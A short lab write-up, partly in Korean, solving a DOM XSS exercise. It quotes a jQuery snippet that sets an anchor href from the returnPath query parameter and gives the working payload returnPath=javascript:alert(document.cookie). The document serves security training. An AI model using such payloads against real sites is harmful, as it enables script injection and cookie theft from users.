# 🚩Lab: DOM XSS in jQuery anchor `href` attribute sink using `location.search` source


This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. 
It uses the jQuery library's `$` selector function to find an anchor element, and changes its href attribute using data from location.search.
To solve this lab, make the "back" link alert `document.cookie`.

### 🔍 분석 및 공격 과정
1. sink가 존재하는 스크립트는 다음과 같다.
```html
<script>
$(function(){
  $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
});
</script>
//$(function(){})는 DOM이 로드된 후 안쪽의 코드를 실행하라는 의미
//$(선택자).메서드
```
2. id가 backLink인 요소의 `href`값을  `new URLSearchParams(window.location.search)).get('returnPath')`로 하는 스크립트이다.
3. `returnPath` 의 값을 `javascript: ` 스킴으로 줘서 alert(document.cookie)를 실행시키면 solve
```html
returnPath=javascript:alert(document.cookie)
```

### 💡 취약점 원리
 source를 별다른 검증없이 sink로 보내는 경우 발생할 수 있는 DOM XSS 
